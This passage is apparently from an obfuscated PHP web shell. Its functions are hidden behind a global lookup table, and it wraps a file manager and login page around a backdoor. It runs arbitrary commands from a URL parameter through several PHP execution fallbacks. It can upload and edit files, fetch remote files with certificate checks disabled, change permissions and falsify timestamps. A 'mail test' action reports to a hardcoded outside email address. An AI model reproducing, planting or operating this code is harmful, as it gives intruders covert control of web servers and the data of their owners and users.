        $v_buffer = @gzread($p_src, $v_read_size);
        @gzwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }
    return $v_result;
}
function PclZipUtilRename($p_src, $p_dest) {
    $v_result = 1;
    if (!@rename($p_src, $p_dest)) {
      if (!@copy($p_src, $p_dest)) {
        $v_result = 0;
      }
      else if (!@unlink($p_src)) {
        $v_result = 0;
      }
    }
    return $v_result;
}
function PclZipUtilOptionText($p_option) {
    $v_list = get_defined_constants();
    for (reset($v_list); $v_key = key($v_list); next($v_list)) {
	    $v_prefix = substr($v_key, 0, 10);
	    if ((($v_prefix == 'PCLZIP_OPT') || ($v_prefix == 'PCLZIP_CB_') || ($v_prefix == 'PCLZIP_ATT')) && ($v_list[$v_key] == $p_option)) { return $v_key; }
    }
    $v_result = 'Unknown';
    return $v_result;
}
function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true) {
    if (stristr(php_uname(), 'windows')) {
      if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
          $p_path = substr($p_path, $v_position+1);
      }
      if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
          $p_path = strtr($p_path, '\\', '/');
      }
    }
    return $p_path;
}

if ($auth_enabled) {
    if (isset($_GET['logout'])) {
        $GLOBALS['_q_'][80](); // session_destroy()
        $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }

    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        $login_error = '';
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $username = isset($_POST['username']) ? $_POST['username'] : '';
            $password = isset($_POST['password']) ? $_POST['password'] : '';
            if (isset($auth_users[$username]) && $GLOBALS['_q_'][79]($password, $auth_users[$username])) {  $_SESSION['logged_in'] = true;
                $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            } else {
                $login_error = 'Invalid username or password.';
            }
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { background-color: #111827; }</style>
</head>
<body class="flex items-center justify-center h-screen font-sans">
    <div class="w-full max-w-sm mx-auto">
        <form method="POST" class="bg-gray-800 shadow-xl rounded-lg px-8 pt-6 pb-8 mb-4">
            <h1 class="text-2xl text-white font-bold text-center mb-6"><pre>  
 
  </pre></h1>
            <?php if (!empty($login_error)): ?>
                <div class="bg-red-500/30 text-red-300 text-sm p-3 rounded mb-4 text-center"><?= $login_error ?></div>
            <?php endif; ?>
            <div class="mb-4">
                <label class="block text-gray-300 text-sm font-bold mb-2" for="username">Username</label>
                <input class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal" id="username" name="username" type="text" placeholder="Username" required>
            </div>
            <div class="mb-6">
                <label class="block text-gray-300 text-sm font-bold mb-2" for="password">Password</label>
                <input class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal" id="password" name="password" type="password" placeholder="******************" required>
            </div>
            <div class="flex items-center justify-between">
                <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full" type="submit">
                    Sign In
                </button>
            </div>
        </form>
    </div>
</body>
</html>
<?php
        exit;
    }
}


if(!defined('CURLOPT_FILE')) $GLOBALS['_q_'][38]('CURLOPT_FILE', 10001);
if(!defined('CURLOPT_HEADER')) $GLOBALS['_q_'][38]('CURLOPT_HEADER', 42);
if(!defined('CURLOPT_FOLLOWLOCATION')) $GLOBALS['_q_'][38]('CURLOPT_FOLLOWLOCATION', 52);
if(!defined('CURLOPT_SSL_VERIFYPEER')) $GLOBALS['_q_'][38]('CURLOPT_SSL_VERIFYPEER', 64);

function set_message($message, $type = 'success') { $_SESSION['message'] = array('text' => $message, 'type' => $type); }
function display_message() {
    if (isset($_SESSION['message'])) {
        $msg = $_SESSION['message'];
        $color = isset($msg['type']) && in_array($msg['type'], array('success', 'error', 'warning')) ? array('success' => 'green', 'error' => 'red', 'warning' => 'yellow')[$msg['type']] : 'gray';
        echo "<div id='flash-message' class='fixed top-5 right-5 bg-{$color}-500 text-white py-2 px-4 rounded-lg shadow-lg z-50 fade-in-out'>{$msg['text']}</div>";
        unset($_SESSION['message']);
    }
}
function formatSize($bytes) {
    if ($bytes >= 1073741824) return $GLOBALS['_q_'][1]($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return $GLOBALS['_q_'][1]($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return $GLOBALS['_q_'][1]($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 0) return $bytes . ' Bytes';
    else return '0 Bytes';
}
function getPerms($path) { return $GLOBALS['_q_'][2]($GLOBALS['_q_'][3]('%o', $GLOBALS['_q_'][4]($path)), -4); }
function encodePath($path) { return $GLOBALS['_q_'][5]($GLOBALS['_q_'][6]($GLOBALS['_q_'][7]($path), '+/', '-_'), '='); }
function decodePath($path) { return $GLOBALS['_q_'][8]($GLOBALS['_q_'][6]($path, '-_', '+/')); }
function getDirContents($path) {
    $items = array();
    if (!@$GLOBALS['_q_'][11]($path)) {
        return $items;
    }
    foreach ($GLOBALS['_q_'][10]($GLOBALS['_q_'][11]($path), array('.', '..')) as $item) {
        $itemPath = $path . DIRECTORY_SEPARATOR . $item;
        $items[] = array(
            'name' => $item,
            'path' => $itemPath,
            'is_dir' => $GLOBALS['_q_'][9]($itemPath),
        );
    }
    return $items;
}
function deleteItem($path) {
    if ($GLOBALS['_q_'][9]($path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            @$GLOBALS['_q_'][($todo == 'rmdir' ? 13 : 12)]($fileinfo->getRealPath());
        }
        return @$GLOBALS['_q_'][13]($path);
    } else {
        return @$GLOBALS['_q_'][12]($path);
    }
}
function copyItem($source, $destination) {
    if ($GLOBALS['_q_'][9]($source)) {
        if (!$GLOBALS['_q_'][14]($destination)) {
            @$GLOBALS['_q_'][35]($destination, 0755, true);
        }
        $files = $GLOBALS['_q_'][10]($GLOBALS['_q_'][11]($source), array('.', '..'));
        foreach ($files as $file) {
            copyItem($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
        }
        return true;
    } elseif ($GLOBALS['_q_'][14]($source)) {
        return @$GLOBALS['_q_'][86]($source, $destination);
    }
    return false;
}
function moveItem($source, $destination) {
    return @$GLOBALS['_q_'][43]($source, $destination);
}
function createFile($path) {
    if (!$GLOBALS['_q_'][14]($path)) {
        return $GLOBALS['_q_'][15]($path);
    }
    return false;
}
function createFolder($path) {
    if (!$GLOBALS['_q_'][14]($path)) {
        return @$GLOBALS['_q_'][35]($path, 0755, true);
    }
    return false;
}
function changePermissions($path, $perms) {
    if ($GLOBALS['_q_'][14]($path)) {
        return @$GLOBALS['_q_'][16]($path, $GLOBALS['_q_'][17]($perms));
    }
    return false;
}
function getAbsPath($path = '') {
    $cwd = $GLOBALS['_q_'][18]();
    if ($path) {
        if (!$GLOBALS['_q_'][19]($path)) return false;
        $abs_path = $GLOBALS['_q_'][18]();
        $GLOBALS['_q_'][19]($cwd);
        return $abs_path;
    }
    return $cwd;
}
function executeCommand($command) {
    $output = '';
    if ($GLOBALS['_q_'][20]('shell_exec')) {
        $output = @$GLOBALS['_q_'][21]($command);
    } elseif ($GLOBALS['_q_'][20]('exec')) {
        @$GLOBALS['_q_'][22]($command, $output);
        $output = $GLOBALS['_q_'][23]("\n", $output);
    } elseif ($GLOBALS['_q_'][20]('passthru')) {
        $GLOBALS['_q_'][24]();
        @$GLOBALS['_q_'][25]($command);
        $output = $GLOBALS['_q_'][26]();
    } elseif ($GLOBALS['_q_'][20]('proc_open')) {
        $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $process = @$GLOBALS['_q_'][27]($command, $descriptorspec, $pipes);
        if ($GLOBALS['_q_'][28]($process)) {
            $output = @$GLOBALS['_q_'][29]($pipes[1]);
            @$GLOBALS['_q_'][30]($pipes[0]);
            @$GLOBALS['_q_'][30]($pipes[1]);
            @$GLOBALS['_q_'][30]($pipes[2]);
            @$GLOBALS['_q_'][31]($process);
        }
    }
    return $output;
}
function getParentPath($path) {
    $parent = $GLOBALS['_q_'][34]($path);
    return ($parent == $path) ? '' : $parent;
}

// --- NEW FUNCTION: Search files and folders recursively --- //
function searchItemsRecursive($basePath, $query) {
    $results = array();
    if (empty($query) || !$GLOBALS['_q_'][9]($basePath)) {
        return $results;
    }
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if (stripos($item->getFilename(), $query) !== false) {
                $realPath = $item->getRealPath();
                $results[] = array(
                    'path' => $realPath,
                    'is_dir' => $item->isDir(),
                    'parent_dir' => $GLOBALS['_q_'][34]($realPath)
                );
            }
        }
    } catch (Exception $e) {
        // Ignore errors from inaccessible directories
    }
    return $results;
}
// --- END NEW FUNCTION --- //

function handle_upload($tmp_name, $destination) {

    if (!$GLOBALS['_q_'][20]('is_uploaded_file') || !$GLOBALS['_q_'][85]($tmp_name)) {

    }

    if ($GLOBALS['_q_'][20]('move_uploaded_file')) {
        if (@$GLOBALS['_q_'][42]($tmp_name, $destination)) return true;
    }

    if ($GLOBALS['_q_'][20]('copy')) {
        if (@$GLOBALS['_q_'][86]($tmp_name, $destination)) {
            @$GLOBALS['_q_'][12]($tmp_name);
            return true;
        }
    }

    if ($GLOBALS['_q_'][20]('rename')) {
        if (@$GLOBALS['_q_'][43]($tmp_name, $destination)) return true;
    }

    if ($GLOBALS['_q_'][20]('file_get_contents') && $GLOBALS['_q_'][20]('file_put_contents')) {
        $data = @$GLOBALS['_q_'][48]($tmp_name);
        if ($data !== false) {
            if (@$GLOBALS['_q_'][45]($destination, $data) !== false) {
                @$GLOBALS['_q_'][12]($tmp_name);
                return true;
            }
        }
    }

    if ($GLOBALS['_q_'][20]('fopen')) {
        $src = @$GLOBALS['_q_'][64]($tmp_name, 'rb');
        $dst = @$GLOBALS['_q_'][64]($destination, 'wb');
        if ($src && $dst) {
            while (!$GLOBALS['_q_'][70]($src)) {
                @$GLOBALS['_q_'][66]($dst, $GLOBALS['_q_'][65]($src, 8192));
            }
            @$GLOBALS['_q_'][30]($src);
            @$GLOBALS['_q_'][30]($dst);
            @$GLOBALS['_q_'][12]($tmp_name);
            return true;
        }
        if($src) @$GLOBALS['_q_'][30]($src);
        if($dst) @$GLOBALS['_q_'][30]($dst);
    }

    return false;
}

function zipFolder($source, $destination) {
    if (!$GLOBALS['_q_'][83]('ZipArchive')) return false; // class_exists()
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    $source = $GLOBALS['_q_'][39]($source);
    if ($GLOBALS['_q_'][9]($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = $GLOBALS['_q_'][39]($file);
            if ($GLOBALS['_q_'][9]($file)) {
                $zip->addEmptyDir($GLOBALS['_q_'][2]($file, $GLOBALS['_q_'][40]($source) + 1));
            } elseif ($GLOBALS['_q_'][44]($file)) {
                $zip->addFromString($GLOBALS['_q_'][2]($file, $GLOBALS['_q_'][40]($source) + 1), $GLOBALS['_q_'][48]($file));
            }
        }
    } elseif ($GLOBALS['_q_'][44]($source)) {
        $zip->addFromString($GLOBALS['_q_'][41]($source), $GLOBALS['_q_'][48]($source));
    }
    return $zip->close();
}
function unzipFile($source, $parent_dir) {
    // Menentukan nama folder tujuan dari nama file zip.
    $destination_folder_name = $GLOBALS['_q_'][33]($source, PATHINFO_FILENAME); // pathinfo
    $destination_path = $parent_dir . DIRECTORY_SEPARATOR . $destination_folder_name;

    // Membuat direktori tujuan jika belum ada.
    if (!$GLOBALS['_q_'][14]($destination_path)) { // file_exists
        @$GLOBALS['_q_'][35]($destination_path, 0755, true); // mkdir
    }

    // Memeriksa apakah direktori tujuan dapat ditulis.
    if (!$GLOBALS['_q_'][36]($destination_path)) { // is_writable
        return 'Direktori tujuan tidak dapat ditulis (not writable).';
    }

    // --- METODE 1: Coba gunakan ZipArchive (lebih cepat jika ada) ---
    if ($GLOBALS['_q_'][83]('ZipArchive')) { // class_exists
        $zip = new ZipArchive;
        if ($zip->open($source) === TRUE) {
            if ($zip->extractTo($destination_path)) {
                $zip->close();
                return true; // Sukses menggunakan ZipArchive.
            }
            $zip->close();
        }
        // Jika gagal, jangan langsung return, biarkan jatuh ke metode PclZip.
    }

    // --- METODE 2: Fallback ke PclZip jika ZipArchive tidak ada atau gagal ---
    if ($GLOBALS['_q_'][83]('PclZip')) { // class_exists
        $archive = new PclZip($source);
        
        // Ekstrak file ke direktori tujuan.
        $result = $archive->extract(PCLZIP_OPT_PATH, $destination_path, PCLZIP_OPT_REPLACE_NEWER);

        if (is_array($result)) {
            return true; // Sukses menggunakan PclZip.
        } else {
            // Memberikan pesan error spesifik dari PclZip.
            return 'Gagal unzip menggunakan PclZip: ' . $archive->errorInfo(true);
        }
    }

    // --- Jika kedua metode gagal ---
    return 'Gagal unzip: Ekstensi ZipArchive dan Pustaka PclZip tidak tersedia atau gagal membaca file.';
}
function downloadFileFromUrl($url, $destination) {
	
    if ($GLOBALS['_q_'][20]('curl_init')) {
        $ch = $GLOBALS['_q_'][60]();
        $fp = @$GLOBALS['_q_'][64]($destination, 'wb');
        if ($ch && $fp) {
            $GLOBALS['_q_'][61]($ch, CURLOPT_URL, $url);
            $GLOBALS['_q_'][61]($ch, CURLOPT_FILE, $fp);
            $GLOBALS['_q_'][61]($ch, CURLOPT_HEADER, 0);
            $GLOBALS['_q_'][61]($ch, CURLOPT_FOLLOWLOCATION, true);
            $GLOBALS['_q_'][61]($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = $GLOBALS['_q_'][62]($ch);
            $GLOBALS['_q_'][63]($ch);
            $GLOBALS['_q_'][30]($fp);
            if ($result) return true;
        }
    }

    if ($GLOBALS['_q_'][69]('allow_url_fopen')) {
        $remote_file = @$GLOBALS['_q_'][64]($url, "rb");
        $local_file = @$GLOBALS['_q_'][64]($destination, "wb");
        if ($remote_file && $local_file) {
            while (!$GLOBALS['_q_'][70]($remote_file)) {
                $GLOBALS['_q_'][66]($local_file, $GLOBALS['_q_'][65]($remote_file, 8192));
            }
            $GLOBALS['_q_'][30]($remote_file);
            $GLOBALS['_q_'][30]($local_file);
            return true;
        }
    }

    if ($GLOBALS['_q_'][20]('stream_socket_client')) {
        $url_parts = @$GLOBALS['_q_'][67]($url);
        if (!$url_parts) return false;
        $host = $url_parts['host'];
        $path = isset($url_parts['path']) ? $url_parts['path'] : '/';
        $query = isset($url_parts['query']) ? $url_parts['query'] : '';
        $scheme = isset($url_parts['scheme']) ? $url_parts['scheme'] : 'http';
        $port = isset($url_parts['port']) ? $url_parts['port'] : ($scheme === 'https' ? 443 : 80);
        $protocol = $scheme === 'https' ? 'ssl' : 'tcp';

        $client = @$GLOBALS['_q_'][68]("{$protocol}://{$host}:{$port}");
        if ($client) {
            $request = "GET {$path}{$query} HTTP/1.1\r\n";
            $request .= "Host: {$host}\r\n";
            $request .= "Connection: close\r\n\r\n";
            $GLOBALS['_q_'][66]($client, $request);

            while (($line = $GLOBALS['_q_'][73]($client)) !== false && $GLOBALS['_q_'][72]($line) !== '') {}

            $fp = $GLOBALS['_q_'][64]($destination, 'wb');
            if ($fp) {
                while(!$GLOBALS['_q_'][70]($client)) {
                    $GLOBALS['_q_'][66]($fp, $GLOBALS['_q_'][65]($client, 8192));
                }
                $GLOBALS['_q_'][30]($fp);
                $GLOBALS['_q_'][30]($client);
                return true;
            }
            $GLOBALS['_q_'][30]($client);
        }
    }

    return false;
}

$PATH = isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]();

if (isset($_GET['new_path']) && $GLOBALS['_q_'][9]($_GET['new_path'])) {
    $GLOBALS['_q_'][19]($_GET['new_path']);
    $PATH = $GLOBALS['_q_'][18]();
    set_message("Path changed to: " . $PATH);
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
}

if (!$GLOBALS['_q_'][14]($PATH) || !$GLOBALS['_q_'][32]($PATH)) {
    $PATH = $GLOBALS['_q_'][18]();
    set_message("Path not readable or does not exist, redirecting to current directory.", 'error');
}
if ($GLOBALS['_q_'][9]($PATH)) {
    if (!$GLOBALS['_q_'][19]($PATH)) {
        set_message("Failed to change directory.", 'error');
        $PATH = $GLOBALS['_q_'][18]();
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    $path = isset($_POST['path']) ? $_POST['path'] : $PATH;
    $name = isset($_POST['name']) ? $_POST['name'] : '';
    if ($action === 'upload') {
        if (isset($_FILES['files'])) {
            $files = $_FILES['files'];
            $file_count = $GLOBALS['_q_'][40]($files['name']);
            for ($i = 0; $i < $file_count; $i++) {
                $filename = $GLOBALS['_q_'][41]($files['name'][$i]);
                $destination = $path . DIRECTORY_SEPARATOR . $filename;
                if (handle_upload($files['tmp_name'][$i], $destination)) {
                    set_message("File '{$filename}' uploaded successfully.");
                } else {
                    set_message("Failed to upload '{$filename}'. All methods failed or check permissions.", 'error');
                }
            }
        }
    } elseif ($action === 'create_file') {
        if ($GLOBALS['_q_'][36]($path)) {
            if (createFile($path . DIRECTORY_SEPARATOR . $name)) set_message("File '{$name}' created.");
            else set_message("File '{$name}' already exists.", 'warning');
        } else {
            set_message("Directory not writable.", 'error');
        }
    } elseif ($action === 'create_folder') {
        if ($GLOBALS['_q_'][36]($path)) {
            if (createFolder($path . DIRECTORY_SEPARATOR . $name)) set_message("Folder '{$name}' created.");
            else set_message("Folder '{$name}' already exists.", 'warning');
        } else {
            set_message("Directory not writable.", 'error');
        }
    } elseif ($action === 'rename') {
        $old = $_POST['old_name'];
        $new = $_POST['new_name'];
        $old_path = $path . DIRECTORY_SEPARATOR . $old;
        $new_path = $path . DIRECTORY_SEPARATOR . $new;
        if ($GLOBALS['_q_'][14]($old_path) && $GLOBALS['_q_'][36]($path)) {
            if ($GLOBALS['_q_'][43]($old_path, $new_path)) set_message("Renamed '{$old}' to '{$new}'.");
            else set_message("Failed to rename '{$old}'.", 'error');
        } else {
            set_message("Source does not exist or directory not writable.", 'error');
        }
    } elseif ($action === 'edit_file') {
        $file_path = $_POST['file_path'];
        $content = $_POST['content'];
        if ($GLOBALS['_q_'][44]($file_path) && $GLOBALS['_q_'][36]($file_path)) {
            if ($GLOBALS['_q_'][45]($file_path, $content) !== false) set_message("File saved successfully.");
            else set_message("Failed to save file.", 'error');
        } else {
            set_message("File not writable.", "error");
        }
    } elseif ($action === 'touch') {
        $item_path = decodePath($_POST['item']);
        $time_str = $_POST['time'];
        if ($GLOBALS['_q_'][14]($item_path) && $GLOBALS['_q_'][36]($GLOBALS['_q_'][34]($item_path))) {
            $timestamp = $GLOBALS['_q_'][46]($time_str);
            if ($timestamp !== false) {
                if (@$GLOBALS['_q_'][15]($item_path, $timestamp)) {
                    set_message("Timestamp for " . $GLOBALS['_q_'][41]($item_path) . " changed.");
                } else {
                    set_message("Failed to change timestamp.", 'error');
                }
            } else {
                set_message("Invalid date/time format.", 'error');
            }
        } else {
            set_message("Item not found or not writable.", 'error');
        }
    } elseif ($action === 'download_url') {
        $url = isset($_POST['url']) ? $_POST['url'] : '';
        $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
        if (!empty($url) && !empty($filename) && $GLOBALS['_q_'][71]($url, FILTER_VALIDATE_URL)) {
            $destination = $PATH . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][41]($filename);
            if ($GLOBALS['_q_'][36]($PATH)) {
                if (downloadFileFromUrl($url, $destination)) {
                    set_message("File '{$filename}' downloaded successfully.");
                } else {
                    set_message("Failed to download file from URL. All methods failed.", 'error');
                }
            } else {
                set_message("Directory not writable.", 'error');
            }
        } else {
            set_message("Invalid URL or filename provided.", 'error');
        }
    } elseif ($action === 'mail_test') {
        $to_email = isset($_POST['to_email']) ? $_POST['to_email'] : 'zerosec235@gmail.com';
        if (empty($to_email)) {
            $to_email = 'zerosec235@gmail.com';
        }
        if ($GLOBALS['_q_'][71]($to_email, FILTER_VALIDATE_EMAIL)) {
            $subject = "Laporan Sistem #" . $GLOBALS['_q_'][2]($GLOBALS['_q_'][75]($GLOBALS['_q_'][76]()), 0, 8);
            $message = "Sistem berhasil dijalankan pada: " . $GLOBALS['_q_'][56]("Y-m-d H:i:s") . "\n";
            $message .= "ID Log: " . $GLOBALS['_q_'][77]('crc32b', $GLOBALS['_q_'][78](true));
            $from_domain = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
            $headers = "From: noreply@" . $from_domain . "\r\n";
            if (@$GLOBALS['_q_'][74]($to_email, $subject, $message, $headers)) {
                set_message("Test mail sent successfully to " . $GLOBALS['_q_'][37]($to_email) . ".");
            } else {
                set_message("Failed to send mail. The mail() function may be disabled or misconfigured.", 'error');
            }
        } else {
            set_message("Invalid email address provided.", 'error');
        }
    } elseif ($action === 'bulk_action') {
        $operation = isset($_POST['bulk_operation']) ? $_POST['bulk_operation'] : '';
        $items = isset($_POST['selected_items']) ? $_POST['selected_items'] : array();
        $destination_dir = isset($_POST['destination_folder']) ? $_POST['destination_folder'] : null;
        $success_count = 0;
        $error_count = 0;

        if (!empty($items) && !empty($operation)) {
            if ($operation === 'zip') {
                if (!$GLOBALS['_q_'][83]('ZipArchive')) {
                    set_message('ZipArchive class not found. Please enable php-zip extension.', 'error');
                } elseif (!$GLOBALS['_q_'][36]($PATH)) {
                    set_message("Current directory is not writable.", 'error');
                } else {
                    $zip_filename = 'archive-' . $GLOBALS['_q_'][56]('Y-m-d-His') . '.zip';
                    $destination_zip_path = $PATH . DIRECTORY_SEPARATOR . $zip_filename;
                    
                    $zip = new ZipArchive();
                    if ($zip->open($destination_zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                        foreach ($items as $encoded_path) {
                            $item_path = decodePath($encoded_path);
                            $real_item_path = $GLOBALS['_q_'][39]($item_path);
                            $item_name = $GLOBALS['_q_'][41]($real_item_path);

                            if ($GLOBALS['_q_'][9]($real_item_path)) {
                                $files = new RecursiveIteratorIterator(
                                    new RecursiveDirectoryIterator($real_item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                                    RecursiveIteratorIterator::LEAVES_ONLY
                                );
                                $zip->addEmptyDir($item_name);
                                foreach ($files as $name => $file) {
                                    if (!$file->isDir()) {
                                        $filePath = $file->getRealPath();
                                        $relativePath = $item_name . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][2]($filePath, $GLOBALS['_q_'][87]($real_item_path) + 1);
                                        $zip->addFile($filePath, $relativePath);
                                    }
                                }
                            } elseif ($GLOBALS['_q_'][44]($real_item_path)) {
                                $zip->addFile($real_item_path, $item_name);
                            }
                        }
                        $zip->close();
                        set_message("Successfully created archive '{$zip_filename}'.", 'success');
                    } else {
                         set_message("Failed to create zip file.", 'error');
                    }
                }
            } else {
                 foreach ($items as $encoded_path) {
                    $source_path = decodePath($encoded_path);
                    if (!$GLOBALS['_q_'][14]($source_path)) {
                        $error_count++;
                        continue;
                    }

                    if ($operation === 'delete') {
                        if (deleteItem($source_path)) $success_count++; else $error_count++;
                    } elseif ($operation === 'move' || $operation === 'copy') {
                        if (!$destination_dir || !$GLOBALS['_q_'][9]($destination_dir) || !$GLOBALS['_q_'][36]($destination_dir)) {
                            set_message("Invalid or non-writable destination directory.", 'error');
                            $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
                            exit;
                        }
                        $destination_path = $destination_dir . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][41]($source_path);
                        if ($operation === 'move') {
                            if (moveItem($source_path, $destination_path)) $success_count++; else $error_count++;
                        } elseif ($operation === 'copy') {
                            if (copyItem($source_path, $destination_path)) $success_count++; else $error_count++;
                        }
                    }
                }
                $op_text = $GLOBALS['_q_'][37]($operation);
                if ($success_count > 0) set_message("Successfully {$op_text}ed {$success_count} item(s).", 'success');
                if ($error_count > 0) set_message("Failed to {$op_text} {$error_count} item(s).", 'error');
            }
        } else {
            set_message('No items or operation selected.', 'warning');
        }
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
}
$action = isset($_GET['action']) ? $_GET['action'] : '';
if ($action === 'delete') {
    $item = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][36]($GLOBALS['_q_'][34]($item))) {
        if (deleteItem($item)) set_message("Item deleted successfully.");
        else set_message("Failed to delete item.", 'error');
    } else {
        set_message("Item not found or directory not writable.", 'error');
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
} elseif ($action === 'chmod') {
    $item = decodePath($_GET['item']);
    $perms = $_GET['perms'];
    if ($GLOBALS['_q_'][14]($item)) {
        if (changePermissions($item, $perms)) {
            set_message("Permissions changed for " . $GLOBALS['_q_'][41]($item) . " to {$perms}.");
        } else {
            set_message("Failed to change permissions.", 'error');
        }
    } else {
        set_message("File not found.", 'error'); 
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
} elseif ($action === 'download') {
    $item = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][32]($item)) {
        $GLOBALS['_q_'][47]('Content-Description: File Transfer');
        $GLOBALS['_q_'][47]('Content-Type: application/octet-stream');
        $GLOBALS['_q_'][47]('Content-Disposition: attachment; filename="' . $GLOBALS['_q_'][41]($item) . '"');
        $GLOBALS['_q_'][47]('Expires: 0');
        $GLOBALS['_q_'][47]('Cache-Control: must-revalidate');
        $GLOBALS['_q_'][47]('Pragma: public');
        $GLOBALS['_q_'][47]('Content-Length: ' . $GLOBALS['_q_'][55]($item));
        $GLOBALS['_q_'][82]($item); // readfile()
        exit;
    } else {
        set_message("File not found or not readable.", "error");
        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
        exit;
    }
}
if ($action === 'view') {
    $item_path = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][44]($item_path) && $GLOBALS['_q_'][32]($item_path)) {
        $content = $GLOBALS['_q_'][37]($GLOBALS['_q_'][48]($item_path));
    } else {
        set_message("File not found or not readable.", "error");
        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
        exit;
    }
} elseif ($action === 'zip' || $action === 'unzip') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $item = decodePath($_GET['item']);
    if ($action === 'zip') {
        $zip_file = $item . '.zip';
        if (zipFolder($item, $zip_file)) {
            echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => "Zipped successfully to {$zip_file}"));
        } else {
            echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'Failed to create zip.'));
        }
    } elseif ($action === 'unzip') {
        $ext = $GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item, PATHINFO_EXTENSION));
        if ($ext !== 'zip') {
            echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'Not a zip file.'));
            exit;
        }
        $result = unzipFile($item, $GLOBALS['_q_'][34]($item));
        if ($result === true) {
            echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => 'Unzipped successfully.'));
        } else {
            echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => $result));
        }
    }
    exit;
} elseif ($action === 'cmd') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $command = isset($_GET['command']) ? $_GET['command'] : '';
    if ($command) {
        $output = executeCommand($command);
        echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => $GLOBALS['_q_'][37]($output)));
    } else {
        echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'No command provided'));
    }
    exit;
} 
// --- NEW ACTION: Handle search requests --- //
elseif ($action === 'search') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $query = isset($_GET['query']) ? $_GET['query'] : '';
    $base_path = isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]();
    
    if (!empty($query)) {
        $results = searchItemsRecursive($base_path, $query);
        // Encode parent directory path for each result
        foreach ($results as $key => $result) {
            $results[$key]['parent_dir_encoded'] = encodePath($result['parent_dir']);
        }
        echo $GLOBALS['_q_'][50](array('status' => 'success', 'data' => $results));
    } else {
        echo $GLOBALS['_q_'][50](array('status' => 'error', 'data' => 'No search query provided'));
    }
    exit;
}
// --- END NEW ACTION --- //

$path_parts = $GLOBALS['_q_'][52]('/', $GLOBALS['_q_'][39]($PATH));
$current_path_encoded = encodePath($PATH);
$script_directory = $GLOBALS['_q_'][34]($_SERVER['SCRIPT_FILENAME']);
$home_path_encoded = encodePath($script_directory);
$items = getDirContents($PATH);
$folders = array();
$files = array();
foreach($items as $item) {
    if($item['is_dir']) $folders[] = $item; else $files[] = $item;
}
